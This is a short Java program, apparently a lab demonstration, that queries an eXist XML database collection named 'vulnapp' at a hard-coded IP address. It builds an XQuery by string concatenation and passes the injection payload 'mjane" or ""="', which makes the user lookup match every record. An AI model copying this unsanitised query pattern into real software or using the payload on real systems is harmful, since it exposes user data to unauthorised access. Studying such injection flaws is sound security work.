import org.exist.xmldb.EXistXQueryService;
import org.xmldb.api.DatabaseManager;
import org.xmldb.api.base.Collection;
import org.xmldb.api.base.CompiledExpression;
import org.xmldb.api.base.Database;
import org.xmldb.api.base.Resource;
import org.xmldb.api.base.ResourceIterator;
import org.xmldb.api.base.ResourceSet;
import org.xmldb.api.modules.XMLResource;
import org.xmldb.api.modules.XPathQueryService;

public class App2 {
    protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
    protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
    protected static String collectionPath = "/db/vulnapp";
    protected static String resourceName = "user.xml";

    public static void main(String[] args) throws Exception {

        // initialize database driver
        Class cl = Class.forName(DRIVER);
        Database database = (Database) cl.newInstance();
        DatabaseManager.registerDatabase(database);

        // get the collection
        Collection col = DatabaseManager.getCollection(URI + collectionPath);

        // query a document
        String input1 = "user.xml";
        String input2 = "mjane\" or \"\"=\"";
        String xQuery = "doc(\""+input1+"\")/userlist/user[uname=\""+input2+"\"]";
        System.out.println("Execute xQuery = " + xQuery);


        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
        xpqs.setProperty("indent", "yes");

        // Execute the query, print the result
        ResourceSet result = xpqs.query(xQuery);
        ResourceIterator i = result.getIterator();
        while (i.hasMoreResources()) {
            Resource r = i.nextResource();
            System.out.println((String) r.getContent());
        }
    }
}
